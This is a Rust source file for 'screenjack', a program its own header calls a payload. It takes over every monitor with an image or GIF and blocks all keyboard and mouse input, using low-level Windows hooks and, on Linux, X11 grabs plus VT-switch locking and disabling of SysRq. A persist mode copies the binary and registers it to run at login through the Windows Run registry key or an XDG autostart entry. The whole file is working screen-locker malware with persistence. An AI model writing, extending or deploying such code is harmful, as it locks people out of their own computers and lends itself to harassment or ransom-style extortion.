// screenjack payload - fullscreen takeover + input lock + image/GIF display
// Usage: screenjack [--persist] [--unpersist] [image_path]
// Exit: Ctrl+Shift+Escape (held 2s)

use std::env;
use std::fs::File;
use std::io::{BufReader, Cursor};
use std::path::Path;
use std::time::Duration;
#[cfg(target_os = "linux")]
use std::time::Instant;

// Embedded asset - set SCREENJACK_ASSET at build time, or uses empty default
#[cfg(feature = "embedded")]
const EMBEDDED_ASSET: &[u8] = include_bytes!(env!("SCREENJACK_ASSET"));
#[cfg(not(feature = "embedded"))]
const EMBEDDED_ASSET: &[u8] = &[];

fn main() {
    let args: Vec<String> = env::args().collect();

    // Handle --persist / --unpersist flags
    if args.iter().any(|a| a == "--persist") {
        if let Err(e) = persist::install() {
            eprintln!("Persist failed: {}", e);
            std::process::exit(1);
        }
        println!("Persistence installed. Will run on login.");
        return;
    }
    if args.iter().any(|a| a == "--unpersist") {
        if let Err(e) = persist::uninstall() {
            eprintln!("Unpersist failed: {}", e);
            std::process::exit(1);
        }
        println!("Persistence removed.");
        return;
    }

    let image_path = args
        .iter()
        .skip(1)
        .find(|a| !a.starts_with("--"))
        .map(|s| s.as_str());

    #[cfg(target_os = "linux")]
    linux::run(image_path);

    #[cfg(target_os = "windows")]
    win::run(image_path);
}

// Load embedded asset as frames
fn load_embedded_frames() -> Option<Vec<AnimFrame>> {
    if EMBEDDED_ASSET.is_empty() {
        return None;
    }
    // Try as GIF first
    if EMBEDDED_ASSET.starts_with(b"GIF") {
        load_gif_from_bytes(EMBEDDED_ASSET)
    } else {
        // Try as static image
        image::load_from_memory(EMBEDDED_ASSET).ok().map(|img| {
            let rgba = img.to_rgba8();
            let (w, h) = rgba.dimensions();
            vec![AnimFrame {
                rgba: rgba.into_raw(),
                width: w,
                height: h,
                delay_ms: 0,
            }]
        })
    }
}

fn load_gif_from_bytes(data: &[u8]) -> Option<Vec<AnimFrame>> {
    let mut decoder = gif::DecodeOptions::new();
    decoder.set_color_output(gif::ColorOutput::RGBA);
    let mut decoder = decoder.read_info(Cursor::new(data)).ok()?;

    let mut screen = gif_dispose::Screen::new_decoder(&decoder);
    let mut frames = Vec::new();

    while let Some(frame) = decoder.read_next_frame().ok()? {
        screen.blit_frame(frame).ok()?;
        let pixels: Vec<_> = screen.pixels_rgba().into_iter().collect();

        let mut rgba = Vec::with_capacity(pixels.len() * 4);
        for p in pixels {
            rgba.push(p.r);
            rgba.push(p.g);
            rgba.push(p.b);
            rgba.push(p.a);
        }

        let delay_ms = (frame.delay as u64) * 10;
        let delay_ms = if delay_ms == 0 { 100 } else { delay_ms };

        frames.push(AnimFrame {
            rgba,
            width: screen.pixels_rgba().width() as u32,
            height: screen.pixels_rgba().height() as u32,
            delay_ms,
        });
    }

    if frames.is_empty() {
        None
    } else {
        Some(frames)
    }
}

const EXIT_HOLD_DURATION: Duration = Duration::from_secs(2);

// Decoded frame with timing
struct AnimFrame {
    rgba: Vec<u8>,
    width: u32,
    height: u32,
    delay_ms: u64,
}

// Load GIF frames using gif-dispose for proper compositing
fn load_gif_frames(path: &str) -> Option<Vec<AnimFrame>> {
    let file = File::open(path).ok()?;
    let mut decoder = gif::DecodeOptions::new();
    decoder.set_color_output(gif::ColorOutput::RGBA);
    let mut decoder = decoder.read_info(BufReader::new(file)).ok()?;

    let mut screen = gif_dispose::Screen::new_decoder(&decoder);
    let mut frames = Vec::new();

    while let Some(frame) = decoder.read_next_frame().ok()? {
        screen.blit_frame(frame).ok()?;
        let pixels: Vec<_> = screen.pixels_rgba().into_iter().collect();

        // Convert rgb::RGBA8 to raw bytes
        let mut rgba = Vec::with_capacity(pixels.len() * 4);
        for p in pixels {
            rgba.push(p.r);
            rgba.push(p.g);
            rgba.push(p.b);
            rgba.push(p.a);
        }

        // GIF delay is in centiseconds, convert to ms
        let delay_ms = (frame.delay as u64) * 10;
        let delay_ms = if delay_ms == 0 { 100 } else { delay_ms }; // default 100ms if 0

        frames.push(AnimFrame {
            rgba,
            width: screen.pixels_rgba().width() as u32,
            height: screen.pixels_rgba().height() as u32,
            delay_ms,
        });
    }

    if frames.is_empty() {
        None
    } else {
        Some(frames)
    }
}

fn is_gif(path: &str) -> bool {
    Path::new(path)
        .extension()
        .map(|e| e.to_ascii_lowercase() == "gif")
        .unwrap_or(false)
}

#[cfg(target_os = "linux")]
mod linux {
    use super::*;
    use x11rb::connection::Connection;
    use x11rb::protocol::xproto::*;
    use x11rb::COPY_DEPTH_FROM_PARENT;

    // ponytail: VT switch blocking via ioctl, requires root
    // VT_LOCKSWITCH disables Ctrl+Alt+Fn, released on process exit
    // Note: test on VM - if process crashes, may need reboot to restore console
    fn try_block_vt_switch() -> Option<()> {
        use std::fs::OpenOptions;
        use std::os::unix::io::AsRawFd;

        // K_OFF = 0x04 - disable keyboard, VT_LOCKSWITCH = 0x560B
        // ponytail: use Ioctl type alias for musl/glibc compat (c_int vs c_ulong)
        #[cfg(target_env = "musl")]
        type Ioctl = libc::c_int;
        #[cfg(not(target_env = "musl"))]
        type Ioctl = libc::c_ulong;

        const KDSKBMODE: Ioctl = 0x4B45;
        const K_OFF: libc::c_int = 0x04;
        const VT_LOCKSWITCH: Ioctl = 0x560B;

        let tty = OpenOptions::new()
            .read(true)
            .write(true)
            .open("/dev/console")
            .ok()?;
        let fd = tty.as_raw_fd();

        // Try to lock VT switching
        unsafe {
            libc::ioctl(fd, VT_LOCKSWITCH, 1);
            libc::ioctl(fd, KDSKBMODE, K_OFF);
        }

        // Keep handle alive - it'll be dropped when process exits, restoring state
        std::mem::forget(tty);
        Some(())
    }

    // ponytail: disable magic sysrq if we have write access
    fn try_disable_sysrq() -> Option<()> {
        std::fs::write("/proc/sys/kernel/sysrq", "0").ok()
    }

    pub fn run(image_path: Option<&str>) {
        // Try to block kernel-level inputs (requires root, silent fail if not)
        let _ = try_block_vt_switch();
        let _ = try_disable_sysrq();
        let (conn, screen_num) = x11rb::connect(None).expect("Failed to connect to X server");
        let screen = &conn.setup().roots[screen_num];
        let root = screen.root;
        // ponytail: root window spans all monitors in X11 (Xinerama/RandR)
        let width = screen.width_in_pixels;
        let height = screen.height_in_pixels;
        let depth = screen.root_depth;

        let win = conn.generate_id().unwrap();
        let values = CreateWindowAux::new()
            .background_pixel(screen.black_pixel)
            .override_redirect(1)
            .event_mask(EventMask::KEY_PRESS | EventMask::KEY_RELEASE | EventMask::EXPOSURE);

        conn.create_window(
            COPY_DEPTH_FROM_PARENT,
            win,
            root,
            0,
            0,
            width,
            height,
            0,
            WindowClass::INPUT_OUTPUT,
            0,
            &values,
        )
        .unwrap();

        conn.map_window(win).unwrap();
        conn.flush().unwrap();

        // Grab inputs
        for _ in 0..10 {
            let kg = conn.grab_keyboard(
                true,
                win,
                x11rb::CURRENT_TIME,
                GrabMode::ASYNC,
                GrabMode::ASYNC,
            );
            let pg = conn.grab_pointer(
                true,
                win,
                EventMask::BUTTON_PRESS | EventMask::POINTER_MOTION,
                GrabMode::ASYNC,
                GrabMode::ASYNC,
                win,
                0u32,
                x11rb::CURRENT_TIME,
            );
            if kg.is_ok()
                && pg.is_ok()
                && kg.unwrap().reply().is_ok()
                && pg.unwrap().reply().is_ok()
            {
                break;
            }
            std::thread::sleep(Duration::from_millis(100));
        }

        // Hide cursor
        let cursor_pixmap = conn.generate_id().unwrap();
        conn.create_pixmap(1, cursor_pixmap, win, 1, 1).unwrap();
        let cursor = conn.generate_id().unwrap();
        conn.create_cursor(cursor, cursor_pixmap, cursor_pixmap, 0, 0, 0, 0, 0, 0, 0, 0)
            .unwrap();
        conn.change_window_attributes(win, &ChangeWindowAttributesAux::new().cursor(cursor))
            .unwrap();

        let gc = conn.generate_id().unwrap();
        conn.create_gc(gc, win, &CreateGCAux::new()).unwrap();
        conn.flush().unwrap();

        // Load media (from path or embedded fallback)
        let frames: Option<Vec<AnimFrame>> = image_path
            .and_then(|path| {
                if is_gif(path) {
                    load_gif_frames(path)
                } else {
                    image::open(path).ok().map(|img| {
                        let img = img.resize_exact(
                            width as u32,
                            height as u32,
                            image::imageops::FilterType::Triangle,
                        );
                        let rgba = img.to_rgba8().into_raw();
                        vec![AnimFrame {
                            rgba,
                            width: width as u32,
                            height: height as u32,
                            delay_ms: 0,
                        }]
                    })
                }
            })
            .or_else(load_embedded_frames);

        let is_animated = frames.as_ref().map(|f| f.len() > 1).unwrap_or(false);
        let mut frame_idx = 0;
        let mut last_frame_time = Instant::now();

        // Exit combo state - track Ctrl(37/105), Shift(50/62), Escape(9)
        // ponytail: keycodes vary by system, these are common X11 codes
        let mut combo_start: Option<Instant> = None;
        fn is_ctrl(code: u8) -> bool {
            code == 37 || code == 105
        } // L/R Ctrl
        fn is_shift(code: u8) -> bool {
            code == 50 || code == 62
        } // L/R Shift
        fn is_escape(code: u8) -> bool {
            code == 9
        }

        // Render a frame
        let render_frame = |conn: &x11rb::rust_connection::RustConnection,
                            frames: &[AnimFrame],
                            idx: usize,
                            win: Window,
                            gc: Gcontext,
                            sw: u16,
                            sh: u16,
                            depth: u8| {
            let frame = &frames[idx];
            // Scale frame to screen
            let img =
                image::RgbaImage::from_raw(frame.width, frame.height, frame.rgba.clone()).unwrap();
            let img = image::imageops::resize(
                &img,
                sw as u32,
                sh as u32,
                image::imageops::FilterType::Nearest,
            );

            // RGBA -> BGRA
            let mut data: Vec<u8> = Vec::with_capacity((sw as usize) * (sh as usize) * 4);
            for pixel in img.pixels() {
                data.push(pixel[2]);
                data.push(pixel[1]);
                data.push(pixel[0]);
                data.push(pixel[3]);
            }
            let _ = conn.put_image(
                ImageFormat::Z_PIXMAP,
                win,
                gc,
                sw,
                sh,
                0,
                0,
                0,
                depth,
                &data,
            );
            let _ = conn.flush();
        };

        // Initial render
        if let Some(ref frames) = frames {
            render_frame(&conn, frames, 0, win, gc, width, height, depth);
        }

        loop {
            // Animation timing
            if is_animated {
                if let Some(ref frames) = frames {
                    let delay = Duration::from_millis(frames[frame_idx].delay_ms);
                    if last_frame_time.elapsed() >= delay {
                        frame_idx = (frame_idx + 1) % frames.len();
                        render_frame(&conn, frames, frame_idx, win, gc, width, height, depth);
                        last_frame_time = Instant::now();
                    }
                }
            }

            // Poll events (non-blocking for animation)
            if let Ok(event) = conn.poll_for_event() {
                if let Some(event) = event {
                    match event {
                        x11rb::protocol::Event::KeyPress(ev) => {
                            // Check exit combo: Ctrl+Shift held (in state) + Escape pressed
                            let state = ev.state;
                            let ctrl = state.contains(KeyButMask::CONTROL);
                            let shift = state.contains(KeyButMask::SHIFT);

                            if ctrl && shift && is_escape(ev.detail) {
                                if combo_start.is_none() {
                                    combo_start = Some(Instant::now());
                                }
                            }
                        }
                        x11rb::protocol::Event::KeyRelease(ev) => {
                            // Reset combo if any combo key is released
                            if is_ctrl(ev.detail) || is_shift(ev.detail) || is_escape(ev.detail) {
                                combo_start = None;
                            }
                        }
                        _ => {}
                    }
                }
            }

            // Check if combo held long enough
            if let Some(start) = combo_start {
                if start.elapsed() >= EXIT_HOLD_DURATION {
                    return;
                }
            }

            // Small sleep to not burn CPU
            std::thread::sleep(Duration::from_millis(10));
        }
    }
}

#[cfg(target_os = "windows")]
#[allow(unsafe_op_in_unsafe_fn, unused_must_use)]
mod win {
    use super::*;
    use image::GenericImageView;
    use std::ptr::null_mut;
    use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
    use std::sync::Mutex;
    use windows::core::w;
    use windows::Win32::Foundation::*;
    use windows::Win32::Graphics::Gdi::*;
    use windows::Win32::System::LibraryLoader::GetModuleHandleW;
    use windows::Win32::UI::Input::KeyboardAndMouse::*;
    use windows::Win32::UI::WindowsAndMessaging::*;

    static CTRL_HELD: AtomicBool = AtomicBool::new(false);
    static SHIFT_HELD: AtomicBool = AtomicBool::new(false);
    static ESCAPE_HELD: AtomicBool = AtomicBool::new(false);
    static COMBO_START_MS: AtomicU64 = AtomicU64::new(0);
    static SHOULD_EXIT: AtomicBool = AtomicBool::new(false);

    static FRAME_IDX: AtomicUsize = AtomicUsize::new(0);
    // Store as (handle_ptr, width, height) - HBITMAP is just a pointer
    static FRAME_BITMAPS: Mutex<Vec<(usize, i32, i32)>> = Mutex::new(Vec::new());
    static SCREEN_W: AtomicUsize = AtomicUsize::new(0);
    static SCREEN_H: AtomicUsize = AtomicUsize::new(0);

    pub fn run(image_path: Option<&str>) {
        unsafe {
            let instance = GetModuleHandleW(None).unwrap();
            // ponytail: use virtual screen for multi-monitor support
            let vx = GetSystemMetrics(SM_XVIRTUALSCREEN); // left edge (can be negative)
            let vy = GetSystemMetrics(SM_YVIRTUALSCREEN); // top edge
            let sw = GetSystemMetrics(SM_CXVIRTUALSCREEN); // total width
            let sh = GetSystemMetrics(SM_CYVIRTUALSCREEN); // total height
            SCREEN_W.store(sw as usize, Ordering::Relaxed);
            SCREEN_H.store(sh as usize, Ordering::Relaxed);

            // Load frames (from path or embedded fallback)
            let mut frame_delays: Vec<u64> = Vec::new();
            let frames = image_path
                .and_then(|path| {
                    if is_gif(path) {
                        load_gif_frames(path)
                    } else {
                        image::open(path).ok().map(|img| {
                            let (w, h) = img.dimensions();
                            let rgba = img.to_rgba8().into_raw();
                            vec![AnimFrame {
                                rgba,
                                width: w,
                                height: h,
                                delay_ms: 0,
                            }]
                        })
                    }
                })
                .or_else(load_embedded_frames);

            if let Some(frames) = frames {
                let hdc = GetDC(None);
                let mut bitmaps = FRAME_BITMAPS.lock().unwrap();

                for frame in &frames {
                    frame_delays.push(frame.delay_ms);

                    // Scale to screen
                    let img =
                        image::RgbaImage::from_raw(frame.width, frame.height, frame.rgba.clone())
                            .unwrap();
                    let img = image::imageops::resize(
                        &img,
                        sw as u32,
                        sh as u32,
                        image::imageops::FilterType::Nearest,
                    );
                    let (w, h) = img.dimensions();

                    let bmi = BITMAPINFO {
                        bmiHeader: BITMAPINFOHEADER {
                            biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
                            biWidth: w as i32,
                            biHeight: -(h as i32),
                            biPlanes: 1,
                            biBitCount: 32,
                            biCompression: BI_RGB.0,
                            ..Default::default()
                        },
                        ..Default::default()
                    };

                    let mut bits: *mut std::ffi::c_void = null_mut();
                    let hbm =
                        CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &mut bits, None, 0).unwrap();

                    let dest =
                        std::slice::from_raw_parts_mut(bits as *mut u8, (w * h * 4) as usize);
                    for (i, pixel) in img.pixels().enumerate() {
                        let off = i * 4;
                        dest[off] = pixel[2];
                        dest[off + 1] = pixel[1];
                        dest[off + 2] = pixel[0];
                        dest[off + 3] = pixel[3];
                    }

                    bitmaps.push((hbm.0 as usize, w as i32, h as i32));
                }
                ReleaseDC(None, hdc);
            }

            let kb_hook =
                SetWindowsHookExW(WH_KEYBOARD_LL, Some(keyboard_hook), instance, 0).unwrap();
            let mouse_hook =
                SetWindowsHookExW(WH_MOUSE_LL, Some(mouse_hook_proc), instance, 0).unwrap();

            let class_name = w!("ScreenjackWindow");
            let wc = WNDCLASSW {
                style: CS_HREDRAW | CS_VREDRAW,
                lpfnWndProc: Some(wndproc),
                hInstance: instance.into(),
                hCursor: HCURSOR(null_mut()),
                hbrBackground: HBRUSH(GetStockObject(BLACK_BRUSH).0),
                lpszClassName: class_name,
                ..Default::default()
            };
            RegisterClassW(&wc);

            let hwnd = CreateWindowExW(
                WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
                class_name,
                w!(""),
                WS_POPUP | WS_VISIBLE,
                vx,
                vy,
                sw,
                sh,
                None,
                None,
                instance,
                None,
            )
            .unwrap();

            ShowWindow(hwnd, SW_SHOWMAXIMIZED);
            SetForegroundWindow(hwnd);
            ShowCursor(false);

            let mut rect = RECT::default();
            GetWindowRect(hwnd, &mut rect).unwrap();
            ClipCursor(Some(&rect)).unwrap();

            // Animation timer
            let is_animated = frame_delays.len() > 1;
            if is_animated {
                let delay = frame_delays.first().copied().unwrap_or(100);
                SetTimer(hwnd, 1, delay as u32, None);
            }

            let mut msg = MSG::default();
            while GetMessageW(&mut msg, None, 0, 0).into() {
                if SHOULD_EXIT.load(Ordering::Relaxed) {
                    break;
                }
                TranslateMessage(&msg);
                DispatchMessageW(&msg);
            }

            UnhookWindowsHookEx(kb_hook).unwrap();
            UnhookWindowsHookEx(mouse_hook).unwrap();
        }
    }

    // ponytail: blocks all keyboard input including system combos
    // Alt+Tab, Win key, Alt+F4, Ctrl+Esc all blocked via LRESULT(1)
    // Ctrl+Alt+Del cannot be blocked in userspace (goes to Winlogon secure desktop)
    unsafe extern "system" fn keyboard_hook(code: i32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
        if code >= 0 {
            let kb = unsafe { *(lparam.0 as *const KBDLLHOOKSTRUCT) };
            let vk = VIRTUAL_KEY(kb.vkCode as u16);
            let is_down = wparam.0 == WM_KEYDOWN as usize || wparam.0 == WM_SYSKEYDOWN as usize;

            // Track modifier state for exit combo
            if vk == VK_CONTROL || vk == VK_LCONTROL || vk == VK_RCONTROL {
                CTRL_HELD.store(is_down, Ordering::Relaxed);
            } else if vk == VK_SHIFT || vk == VK_LSHIFT || vk == VK_RSHIFT {
                SHIFT_HELD.store(is_down, Ordering::Relaxed);
            } else if vk == VK_ESCAPE {
                ESCAPE_HELD.store(is_down, Ordering::Relaxed);
            }

            // Exit combo check: Ctrl+Shift+Escape held 2s
            if CTRL_HELD.load(Ordering::Relaxed)
                && SHIFT_HELD.load(Ordering::Relaxed)
                && ESCAPE_HELD.load(Ordering::Relaxed)
            {
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .unwrap()
                    .as_millis() as u64;
                let start = COMBO_START_MS.load(Ordering::Relaxed);
                if start == 0 {
                    COMBO_START_MS.store(now, Ordering::Relaxed);
                } else if now - start >= EXIT_HOLD_DURATION.as_millis() as u64 {
                    SHOULD_EXIT.store(true, Ordering::Relaxed);
                    unsafe { PostQuitMessage(0) };
                }
            } else {
                COMBO_START_MS.store(0, Ordering::Relaxed);
            }

            // Block all input unless exiting
            if !SHOULD_EXIT.load(Ordering::Relaxed) {
                return LRESULT(1);
            }
        }
        unsafe { CallNextHookEx(None, code, wparam, lparam) }
    }

    // ponytail: blocks all mouse input while active
    unsafe extern "system" fn mouse_hook_proc(
        code: i32,
        wparam: WPARAM,
        lparam: LPARAM,
    ) -> LRESULT {
        if code >= 0 && !SHOULD_EXIT.load(Ordering::Relaxed) {
            return LRESULT(1);
        }
        unsafe { CallNextHookEx(None, code, wparam, lparam) }
    }

    unsafe extern "system" fn wndproc(
        hwnd: HWND,
        msg: u32,
        wparam: WPARAM,
        lparam: LPARAM,
    ) -> LRESULT {
        match msg {
            WM_TIMER => {
                let bitmaps = FRAME_BITMAPS.lock().unwrap();
                if bitmaps.len() > 1 {
                    let idx = (FRAME_IDX.load(Ordering::Relaxed) + 1) % bitmaps.len();
                    FRAME_IDX.store(idx, Ordering::Relaxed);
                    InvalidateRect(hwnd, None, false);
                }
                LRESULT(0)
            }
            WM_PAINT => {
                let mut ps = PAINTSTRUCT::default();
                let hdc = BeginPaint(hwnd, &mut ps);

                let bitmaps = FRAME_BITMAPS.lock().unwrap();
                if !bitmaps.is_empty() {
                    let idx = FRAME_IDX.load(Ordering::Relaxed);
                    let (hbm_ptr, w, h) = bitmaps[idx];
                    let hbm = HBITMAP(hbm_ptr as *mut _);

                    let mem_dc = CreateCompatibleDC(hdc);
                    let old = SelectObject(mem_dc, hbm);

                    let sw = SCREEN_W.load(Ordering::Relaxed) as i32;
                    let sh = SCREEN_H.load(Ordering::Relaxed) as i32;
                    StretchBlt(hdc, 0, 0, sw, sh, mem_dc, 0, 0, w, h, SRCCOPY).unwrap();

                    SelectObject(mem_dc, old);
                    DeleteDC(mem_dc).unwrap();
                }

                EndPaint(hwnd, &ps);
                LRESULT(0)
            }
            x if x == WM_CLOSE || x == WM_DESTROY => LRESULT(0),
            _ => DefWindowProcW(hwnd, msg, wparam, lparam),
        }
    }
}

// ponytail: boot persistence - copies self to user dir, registers autostart
mod persist {
    use std::env;
    use std::fs;
    use std::io;
    use std::path::PathBuf;

    #[cfg(target_os = "linux")]
    pub fn install() -> io::Result<()> {
        let self_path = env::current_exe()?;

        // Copy to ~/.local/bin/screenjack
        let home = env::var("HOME")
            .map_err(|_| io::Error::new(io::ErrorKind::NotFound, "HOME not set"))?;
        let bin_dir = PathBuf::from(&home).join(".local/bin");
        fs::create_dir_all(&bin_dir)?;
        let dest = bin_dir.join("screenjack");
        fs::copy(&self_path, &dest)?;

        // Make executable
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&dest, fs::Permissions::from_mode(0o755))?;
        }

        // Create XDG autostart entry
        let autostart_dir = PathBuf::from(&home).join(".config/autostart");
        fs::create_dir_all(&autostart_dir)?;
        let desktop = format!(
            "[Desktop Entry]\nType=Application\nName=Screenjack\nExec={}\nHidden=false\nX-GNOME-Autostart-enabled=true\n",
            dest.display()
        );
        fs::write(autostart_dir.join("screenjack.desktop"), desktop)?;
        Ok(())
    }

    #[cfg(target_os = "linux")]
    pub fn uninstall() -> io::Result<()> {
        let home = env::var("HOME")
            .map_err(|_| io::Error::new(io::ErrorKind::NotFound, "HOME not set"))?;
        let _ = fs::remove_file(PathBuf::from(&home).join(".local/bin/screenjack"));
        let _ = fs::remove_file(PathBuf::from(&home).join(".config/autostart/screenjack.desktop"));
        Ok(())
    }

    #[cfg(target_os = "windows")]
    pub fn install() -> io::Result<()> {
        use std::ptr::null_mut;
        use windows::core::PCWSTR;
        use windows::Win32::System::Registry::*;

        let self_path = env::current_exe()?;

        // Copy to %APPDATA%\screenjack\screenjack.exe
        let appdata = env::var("APPDATA")
            .map_err(|_| io::Error::new(io::ErrorKind::NotFound, "APPDATA not set"))?;
        let app_dir = PathBuf::from(&appdata).join("screenjack");
        fs::create_dir_all(&app_dir)?;
        let dest = app_dir.join("screenjack.exe");
        fs::copy(&self_path, &dest)?;

        // Add to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        unsafe {
            let mut key: HKEY = HKEY::default();
            let subkey: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                .encode_utf16()
                .collect();

            if RegOpenKeyExW(
                HKEY_CURRENT_USER,
                PCWSTR(subkey.as_ptr()),
                0,
                KEY_SET_VALUE,
                &mut key,
            )
            .is_ok()
            {
                let name: Vec<u16> = "Screenjack\0".encode_utf16().collect();
                let value: Vec<u16> = format!("\"{}\"\0", dest.display()).encode_utf16().collect();
                RegSetValueExW(
                    key,
                    PCWSTR(name.as_ptr()),
                    0,
                    REG_SZ,
                    Some(
                        &value
                            .iter()
                            .flat_map(|&c| c.to_le_bytes())
                            .collect::<Vec<_>>(),
                    ),
                );
                RegCloseKey(key);
            }
        }
        Ok(())
    }

    #[cfg(target_os = "windows")]
    pub fn uninstall() -> io::Result<()> {
        use windows::core::PCWSTR;
        use windows::Win32::System::Registry::*;

        let appdata = env::var("APPDATA")
            .map_err(|_| io::Error::new(io::ErrorKind::NotFound, "APPDATA not set"))?;
        let _ = fs::remove_dir_all(PathBuf::from(&appdata).join("screenjack"));

        unsafe {
            let mut key: HKEY = HKEY::default();
            let subkey: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Run\0"
                .encode_utf16()
                .collect();

            if RegOpenKeyExW(
                HKEY_CURRENT_USER,
                PCWSTR(subkey.as_ptr()),
                0,
                KEY_SET_VALUE,
                &mut key,
            )
            .is_ok()
            {
                let name: Vec<u16> = "Screenjack\0".encode_utf16().collect();
                let _ = RegDeleteValueW(key, PCWSTR(name.as_ptr()));
                RegCloseKey(key);
            }
        }
        Ok(())
    }
}
